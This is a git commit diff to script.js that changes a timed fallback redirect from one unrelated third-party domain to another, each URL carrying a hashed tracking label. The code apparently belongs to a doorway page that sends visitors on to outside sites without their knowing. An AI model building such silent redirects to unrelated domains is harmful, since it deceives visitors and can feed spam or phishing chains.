5fdbdd66cf13a1a09fb7a56dfd2a0e2e2e3ab1de
tinnlei <lucky_chenlei@msn.com>
2025-03-15 01:37:57 +0300

    Add files via upload

--- script.js
+++ script.js
@@ -2,6 +2,6 @@
 // Backup redirect if meta refresh fails
 setTimeout(() => {
   if (window.location.href === document.location.href) {
-    window.location.href = 'https://abrasifs-outillages.com/?label=e915bde81f4afd218093c3996094105a';
+    window.location.href = 'https://itsasbideparking.fr?label=ae2e5459743438c36414a7b86781a2ab';
   }
 }, 3500);
